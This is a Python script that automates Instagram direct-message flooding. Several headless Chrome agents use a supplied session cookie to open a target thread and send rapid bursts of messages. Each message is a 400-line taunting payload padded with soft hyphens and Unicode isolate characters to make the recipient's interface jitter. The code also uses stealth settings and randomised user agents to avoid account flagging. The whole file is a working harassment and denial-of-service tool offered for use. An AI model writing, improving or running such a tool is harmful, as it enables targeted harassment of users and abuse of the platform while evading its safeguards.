# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (JITTER-STICK V75)
# 📅 STATUS: UI-THRASHING-ACTIVE | 4-AGENT TOTAL | AWS-CPU-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- ⚡ VELOCITY & SAFETY CONFIG ---
AGENTS_PER_MACHINE = 4             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.02, 0.1)   # 🔥 Ultra-Fast Delivery
REST_AFTER_STRIKES = 400   
REST_DURATION = 1          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_jitter_sticky_payload():
    """Generates an unstable layout that forces UI jitter and sticky presence."""
    u_id = random.randint(1000, 9999)
    # \u00AD = Soft Hyphen (The 'Jitter' trigger)
    # \u2068 = FSI (The 'Sticky' vertical trigger)
    # \u2060 = Word Joiner (The 'Buffer' lock)
    shy, fsi, pdi, glue = "\u00AD", "\u2068", "\u2069", "\u2060"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOCK:{u_id}]"
    
    body = []
    # 400 lines of mathematically unstable text
    for i in range(400):
        # We sandwich letters with Soft Hyphens. 
        # The browser thinks: 'Should I wrap here? Maybe?' 
        # This causes the 'Jitter' every time a new message loads.
        word = f"P{shy}R{shy}A{shy}V{shy}E{shy}E{shy}R"
        line = f"{fsi}{word} PAPA ON TOP{pdi}{glue*10} 🌙 {i}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        # Unique User-Agents to prevent account flagging
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Bypasses UI thread lag with direct event injection."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_jitter_sticky_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Jitter-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 100 == 0:
                        driver.refresh()
                        time.sleep(10)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
